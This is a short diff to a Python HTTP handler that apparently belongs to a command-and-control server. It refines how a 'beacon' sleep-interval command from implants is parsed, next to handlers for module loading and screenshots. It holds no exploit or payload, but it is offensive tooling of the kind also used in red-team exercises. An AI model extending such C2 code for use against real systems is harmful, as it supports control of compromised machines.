@@ -392,10 +392,8 @@ class MyHandler(BaseHTTPRequestHandler):
                     if "loadmodule" in executedCmd:
                         print("Module loaded successfully")
                         update_task(taskId, "Module loaded successfully")
-                    elif "beacon" in executedCmd.lower():
-                        new_sleep = executedCmd.replace('set-beacon ', '')
-                        new_sleep = new_sleep.replace('setbeacon ', '')
-                        new_sleep = new_sleep.replace('beacon ', '').strip()
+                    elif executedCmd.lower().startswith("beacon "):
+                        new_sleep = executedCmd.replace('beacon ', '').strip()
                         update_sleep(new_sleep, RandomURI)
                     elif "get-screenshot" in executedCmd.lower():
                         try:
